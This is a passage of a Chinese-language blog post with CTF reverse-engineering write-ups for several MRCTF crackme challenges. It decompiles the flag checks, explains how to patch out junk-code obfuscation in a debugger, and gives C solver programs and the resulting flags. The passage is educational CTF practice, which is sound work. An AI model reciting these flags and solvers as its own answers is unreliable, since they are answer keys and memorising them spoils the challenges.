class="number">121</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">33</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">54</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">85</span>,<span class="number">111</span>,<span class="number">39</span>,<span class="number">97</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Give Me Your Flag LOL!:"</span>)</span><br><span class="line">flag=<span class="built_in">io</span>.<span class="built_in">read</span>()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">len</span>(flag)~=<span class="number">28</span> <span class="keyword">then</span> <span class="string">[[~是异或]]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Wrong flag!"</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span>,<span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line"><span class="keyword">local</span> x=<span class="built_in">string</span>.<span class="built_in">byte</span>(flag,i)</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span> <span class="keyword">then</span> <span class="string">[[第偶数个字符a[i]^=i 这里直接再^一次i就可以了]]</span></span><br><span class="line">x=x~i</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">x=x+<span class="number">6</span> <span class="string">[[不是偶数个则是奇数个a[i]+=6 逆向就是a[i]-=6]]</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> x~=cmps[i] <span class="keyword">then</span> <span class="string">[[处理完之后与上面给的字符串相比较]]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Wrong flag!"</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Right flag!"</span>)</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[]=&#123;<span class="number">0</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">76</span>,<span class="number">125</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">107</span>,<span class="number">85</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">121</span>,</span><br><span class="line"><span class="number">122</span>,<span class="number">101</span>,<span class="number">33</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">54</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">85</span>,<span class="number">111</span>,<span class="number">39</span>,<span class="number">97</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;a[i];i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">a[i]^=i;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a[i]-=<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,(<span class="keyword">char</span>*)a+<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:MRCTF{7he_83st_1u@_f0r_yOu!}</p></blockquote><p>之后我尝试在内存里找到运行逻辑,失败告终,然后跑去问出题人,出题人说这个题目就是lua lu,内嵌了一个lua解释器(那么我可以改内存来达到盗用他的lua解释器!),大概就是不让那些喜欢静态调试的人好过吧</p><p><a href="https://share.weiyun.com/5oqrVqM" target="_blank" rel="noopener">该题官方下载链接</a></p><hr><h1 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h1><p>好了这题咱不吃上一题的亏 直接丢进x64dbg(x32dbg提示我的)</p><p>丢进去以后老规矩搜索字符串,定位关键点,在Give me your code下面发现strlen函数并且cmp 0x21</p><p><img src="https://i.loli.net/2020/03/30/k6JsZOh8VRqzGpy.png" alt=""></p><p>过了len的判断 再往下跟就到把input一顿xx的地方</p><p><img src="https://i.loli.net/2020/03/30/ekNPiyjFCVBfZvz.png" alt=""></p><p>怎么xx的先不管 再往下看看</p><p><img src="https://i.loli.net/2020/03/30/NftvWehankV4u6K.png" alt=""></p><p>一个一个cmp 不是就exit 很好这就是被xx过后的input 那么我们拿它来反xx就可以得到flag了</p><p>好了我摊牌了,听说re爷爷看汇编跟看小说一样,我…我是re孙子,咱们上神器IDA_F5</p><p><img src="https://i.loli.net/2020/03/30/7dWoL12OXZ4B5tY.png" alt=""></p><p>这次居然有main,要是没有main的话直接取后面的动态调试的地址ctrl+g过去找近的函数F5就OK了,要是被aslr了那就还是shift+f12找字符串过去吧,最后直接上exp,话说前面那个算法我分析了好久,以为我没弄错,是f5的错(f5经常抽风),害,我好菜,我菜死了</p><p>分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  input[i] = input_[key_1[i]];<span class="comment">//将input第key_1[i]位置的放到key_2[i],</span></span><br><span class="line">    <span class="comment">//那么要把key_2[i]放到flag第key_1[i]位置</span></span><br><span class="line">  v4 = i;</span><br><span class="line">  input[i] ^= LOBYTE(key_1[i]);<span class="comment">//再 ^= key_1[i]</span></span><br><span class="line">&#125;<span class="comment">//LOBYTE相当于取变量的最低byte位来赋值</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = j;</span><br><span class="line">  <span class="keyword">if</span> ( key_2[j] != input[j] )<span class="comment">//转换后与key_2比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_40E640(argc, (__int64)argv, j, (__int64)<span class="string">"Wrong!\n"</span>);</span><br><span class="line">    system(*(<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;argc);</span><br><span class="line">    <span class="built_in">exit</span>(argc);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key_1[]=&#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">16</span>,<span class="number">3</span>,<span class="number">17</span>,<span class="number">32</span>,<span class="number">29</span>,<span class="number">11</span>,<span class="number">30</span>,</span><br><span class="line">                 <span class="number">27</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">25</span>,<span class="number">5</span>,<span class="number">31</span>,<span class="number">8</span>,<span class="number">18</span>,<span class="number">26</span>,<span class="number">28</span>,<span class="number">14</span>,<span class="number">0</span>&#125;;<span class="comment">//本来他是int但是没必要用了</span></span><br><span class="line"><span class="keyword">char</span> key_2[]=<span class="string">"gy&#123;\x7Fu+&lt;RSyW^]B&#123;-*fB~LWyAk~e&lt;\\EobM"</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">34</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">32</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[key_1[i]] = key_2[i];</span><br><span class="line">flag[key_1[i]] ^= key_1[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}</p></blockquote><p><a href="https://buuoj.cn/files/ff2c74be82fa1f272c72d3973f13802d/attachment.zip?token=eyJ1c2VyX2lkIjo3NzEyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzcyfQ.XohQcA.rL3HzGTeBUk2OW-V5CO04F0853Y" target="_blank" rel="noopener">该题官方下载链接</a></p><hr><h1 id="Junk"><a href="#Junk" class="headerlink" title="Junk"></a>Junk</h1><p>拿到题目先丢进ida,shift+f12看到了 “<strong>give me your flag!</strong>“ ,然后交叉引用,然后f5,然后欸?怎么f5不了?f5报错了居然!不急不急,按空格切换视图,记下左边的地址,<strong>401390</strong></p><p><img src="https://i.loli.net/2020/03/31/N8ce5np6XRQKvTx.png" alt=""></p><p>然后咱把它丢进od,ctrl+g跳到这个地方,再一顿改名分析,发现了关键call</p><p><img src="https://i.loli.net/2020/03/31/m3rtTbSRxOj2Eun.png" alt=""></p><p>enter进去看看</p><img src="https://i.loli.net/2020/03/31/nczgMy2IemfsWLV.png" alt="" style="zoom:80%;" /><p>好了len出来了,往下继续看</p><img src="https://i.loli.net/2020/03/31/auA4Zt81YXFPKyR.png" alt=""  /><p>这个call,噫,有点意思,call指令分为两步,先push下一条指令的地址入栈,然后jmp去一个地方,这里过来直接把入栈的地址加了一,后面retn就是到了之前入栈的下一个地址的+1的地方,意思就是说下面那里根本不是一个call,前面那一位E8是根本不会走的,那么我们把它nop掉,这样就能看见了</p><p><img src="https://i.loli.net/2020/03/31/ru4Sn2wvfCZB8Tl.png" alt=""></p><p>这里说一下怎么nop他,在下面的数据窗口ctrl+g输入<strong>401256</strong>即那个call的地址,再双击第一个E8改成90就是nop了</p><p><img src="https://i.loli.net/2020/03/31/RGpubHnTM4X2Z8d.png" alt=""></p><p>这样逻辑很清晰了,这里才几句用不着看F5也可以知道这里的算法是把每一位都^3</p><p><img src="https://i.loli.net/2020/03/31/38BV4TRosxEmkHw.png" alt=""></p><p>异或完了可以看见他直接跳过了这里,那么我们就可以料想这两个call一点P用都没有,再往下看看</p><p><img src="https://i.loli.net/2020/03/31/2hS1bQxHAocvra3.png" alt=""></p><p>什么?je跳过去的线断了?其实并不是,只是od把这里以为是个call其实他是个屁call,他直接je到了<strong>401280</strong>,而这个call的地址是<strong>40127F</strong>,也就是说这里是一个假call,那咱再把他nop掉</p><p><img src="https://i.loli.net/2020/03/31/aI9ti1QW8HbRGFs.png" alt=""></p><p>因为上面那个xor,zf标志寄存器一定会为1,je一定会跳过,那么我们直接把je也一块nop了,下面也有一个一毛一样的结构,于是我顺手就nop完了,好了我们现在下面就是剩下的程序了,但是菜鸡看不懂汇编呢,现在能f5了吗?试试看?右键-&gt;复制到可执行文件-&gt;所有修改,文件-&gt;右键-&gt;保存文件</p><p>我们来对比一下</p><p><img src="https://i.loli.net/2020/03/31/7ZcxeTB2GHbNA6l.png" alt="">之前是这个样子的,点进去并不能F5</p><p><img src="https://i.loli.net/2020/03/31/QWxUog5IT8qYalL.png" alt="">之后是这个样子的,点进去可以F5</p><p>分析一波如下</p><img src="https://i.loli.net/2020/03/31/LXIVxGgPlEQqicF.png" alt=""  /><p>game3分析如下</p><p><img src="https://i.loli.net/2020/03/31/2lgwF54DuQrMVKP.png" alt=""></p><p>逆向算法思路:从key反推是table几,保存起来,在反base64算法,再反game2,最后反game1,完事</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> table[]=&#123;<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,<span class="number">0x49</span>,<span class="number">0x4A</span>,</span><br><span class="line"><span class="number">0x4B</span>,<span class="number">0x4C</span>,<span class="number">0x4D</span>,<span class="number">0x4E</span>,<span class="number">0x4F</span>,<span class="number">0x50</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x53</span>,<span class="number">0x54</span>,<span class="number">0x55</span>,</span><br><span class="line"><span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x58</span>,<span class="number">0x59</span>,<span class="number">0x5A</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,</span><br><span class="line"><span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6A</span>,<span class="number">0x6B</span>,<span class="number">0x6C</span>,<span class="number">0x6D</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x79</span>,<span class="number">0x7A</span>,<span class="number">0x29</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x40</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x5E</span>,<span class="number">0x26</span>,<span class="number">0x2A</span>,<span class="number">0x28</span>,<span class="number">0x2B</span>,<span class="number">0x2F</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> key[]=&#123;<span class="number">0x25</span>,<span class="number">0x42</span>,<span class="number">0x55</span>,<span class="number">0x45</span>,<span class="number">0x64</span>,<span class="number">0x56</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x6D</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x57</span>,<span class="number">0x68</span>,<span class="number">0x70</span>,<span class="number">0x5A</span>,<span class="number">0x6E</span>,<span class="number">0x21</span>,<span class="number">0x6F</span>,<span class="number">0x61</span>,<span class="number">0x57</span>,<span class="number">0x5A</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x61</span>,<span class="number">0x47</span>,<span class="number">0x42</span>,<span class="number">0x73</span>,<span class="number">0x5A</span>,<span class="number">0x40</span>,<span class="number">0x5A</span>,<span class="number">0x70</span>,<span class="number">0x5A</span>,<span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x21</span>,<span class="number">0x6F</span>,<span class="number">0x61</span>,<span class="number">0x57</span>,<span class="number">0x5A</span>,<span class="number">0x28</span>,<span class="number">0x61</span>,<span class="number">0x47</span>,<span class="number">0x42</span>,<span class="number">0x73</span>,<span class="number">0x5A</span>,</span><br><span class="line"><span class="number">0x40</span>,<span class="number">0x5A</span>,<span class="number">0x70</span>,<span class="number">0x5A</span>,<span class="number">0x6E</span>,<span class="number">0x21</span>,<span class="number">0x6F</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0x78</span>,<span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x5A</span>,<span class="number">0x6D</span>,<span class="number">0x25</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x2E</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">60</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">60</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;key[i];i++)<span class="comment">//这一步是从key反推table里的经过仿base64的input</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;table[j];j++)</span><br><span class="line"><span class="keyword">if</span>(key[i]==table[j])</span><br><span class="line">&#123; </span><br><span class="line">temp[i]=j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;<span class="number">43</span>;i+=<span class="number">3</span>,j+=<span class="number">4</span>)<span class="comment">//这里是反仿base64,在纸上写两下再用计算器转换二进制就能看明白</span></span><br><span class="line">&#123;</span><br><span class="line">flag[i] = ((temp[j] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">2</span>) + ((temp[j+<span class="number">1</span>] &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">flag[i+<span class="number">1</span>] = ((temp[j+<span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>) + ((temp[j+<span class="number">2</span>] &amp; <span class="number">0x3C</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">flag[i+<span class="number">2</span>] = ((temp[j+<span class="number">2</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) + (temp[j+<span class="number">3</span>] &amp; <span class="number">0x3F</span>);</span><br><span class="line">&#125;<span class="comment">//不过当时这里卡了我挺久菜鸡还是菜啊</span></span><br><span class="line"><span class="comment">/*for(int i=0;i&lt;45;i++)//我们甚至可以看到补上的那两个0</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%+02X ",flag[i]);</span></span><br><span class="line"><span class="comment">if((i+1)%9==0)</span></span><br><span class="line"><span class="comment">printf("\n");</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">43</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = flag[i] % <span class="number">16</span> * <span class="number">16</span> + flag[i] / <span class="number">16</span>;<span class="comment">//反game2,单字节十六进制换位置</span></span><br><span class="line">flag[i] ^= <span class="number">3</span>;<span class="comment">//反game1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag:MRCTF{junkjunkjunkcodejunkjunkcodejunkcode}</p></blockquote><p><a href="https://share.weiyun.com/5Nvew53" target="_blank" rel="noopener">该题官方下载链接</a></p><hr><h1 id="shit"><a href="#shit" class="headerlink" title="shit"></a>shit</h1><p>丢进IDA里容易发现这个,不过呢这里点过去不能F5,因为他做了混淆,我们动态跑进去把他混淆的地方nop掉</p><p><img src="https://ae01.alicdn.com/kf/H7121155f75014506835d0a706c81188fV.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/H95e3f4f8e26045d48ba0880fe360c8f2q.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/Hdf55adf68dde4894968edf48104c312db.png" alt="image-20200401114455599"></p><p>然后右键补丁,效果如下</p><p><img src="https://ae01.alicdn.com/kf/Hbacb71407f564511b59f345d064792bam.png" alt=""></p><p>反汇编分析如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __cdecl <span class="title">sub_4012F0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input); i += <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = input[i + <span class="number">3</span>] | (input[i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (input[i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (input[i] &lt;&lt; <span class="number">24</span>);</span><br><span class="line"><span class="comment">// 4个char的input放到一个unsigned int里</span></span><br><span class="line">    v2 = (v1 &lt;&lt; (<span class="number">32</span> - *(&amp;key_1 + <span class="number">4</span> * (i / <span class="number">4</span>)))) | (v1 &gt;&gt; *(&amp;key_1 + i / <span class="number">4</span>));</span><br><span class="line"><span class="comment">// 循环右移key_1[i/4]位  这里key_1有问题,运行之后会被改变,动调把他取下来</span></span><br><span class="line">    sub_4013CA();<span class="comment">// p用没有</span></span><br><span class="line">    v6 = ((v2 &lt;&lt; <span class="number">16</span>) | ~HIWORD(v2)) ^ (<span class="number">1</span> &lt;&lt; *(&amp;key_1 + i / <span class="number">4</span>));</span><br><span class="line"><span class="comment">// 前四位后四位换位置并把前四位取反之后^= 1&lt;&lt;key_1[i/4]</span></span><br><span class="line">    sub_40140F();<span class="comment">// 把那里面两个call nop掉,这里就看不见了,不信你试试</span></span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">0</span> )</span><br><span class="line">      v6 ^= v4;<span class="comment">// 再^=上一个v6 如果有的话</span></span><br><span class="line">    v4 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != key_2[i / <span class="number">4</span>] )<span class="comment">// 此时v6=key_2[i/4]</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向思路:</p><ol><li><strong>key_2 ^=上一个key_2(</strong>如果有的话),</li><li>再拿结果 <strong>^=1&lt;&lt;key_1[i/4]</strong>的<strong>后四位取反</strong>,再把<strong>前后4位换位置</strong>,</li><li>再<strong>循环左移key_1[i/4]位</strong>,这个时候的结果转换成char输出就是flag了</li></ol><p>完整exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rol( a , o ) \</span></span><br><span class="line">((a&lt;&lt;(o%<span class="number">0x20</span>)) | (a&gt;&gt;(<span class="number">0x20</span> - (o%<span class="number">0x20</span>))))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ror( a , o ) \</span></span><br><span class="line">((a&gt;&gt;(o%<span class="number">0x20</span>)) | (a&lt;&lt;(<span class="number">0x20</span> - (o%<span class="number">0x20</span>))))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key1[]=&#123;<span class="number">0x3</span>,<span class="number">0x10</span>,<span class="number">0xD</span>,<span class="number">0x4</span>,<span class="number">0x13</span>,<span class="number">0xB</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> key2[]=&#123;<span class="number">0x8C2C133A</span>,<span class="number">0xF74CB3F6</span>,<span class="number">0xFEDFA6F2</span>,<span class="number">0xAB293E3B</span>,<span class="number">0x26CF8A2A</span>,<span class="number">0x88A1F279</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v1,v2,v3,v4;<span class="comment">//unsigned特别重要</span></span><br><span class="line"><span class="keyword">char</span> input[]=&#123;<span class="number">0x66</span>,<span class="number">0x6C</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x7B</span>,<span class="number">0x61</span>,<span class="number">0x5F</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x32</span>,<span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x5F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x5F</span>,<span class="number">0x66</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x5F</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x7D</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">v3 = key2[i];</span><br><span class="line"><span class="keyword">if</span>(i)</span><br><span class="line">v3 ^= key2[i<span class="number">-1</span>];</span><br><span class="line">v3 ^= (<span class="number">1</span> &lt;&lt; key1[i]);</span><br><span class="line">v2 = ((v3&amp; <span class="number">0xFFFF0000</span>) &gt;&gt; <span class="number">16</span>) + (((~v3) &amp; <span class="number">0xFFFF</span>) &lt;&lt; <span class="number">16</span>);<span class="comment">//先取反后取位,不然错</span></span><br><span class="line"><span class="comment">//v1 = rol(v2,key1[i]);  </span></span><br><span class="line">v1 = (v2 &gt;&gt; (<span class="number">32</span> - key1[i])) | (v2 &lt;&lt; key1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c"</span>,*((<span class="keyword">char</span>*)&amp;v1+<span class="number">3</span>),*((<span class="keyword">char</span>*)&amp;v1+<span class="number">2</span>),*((<span 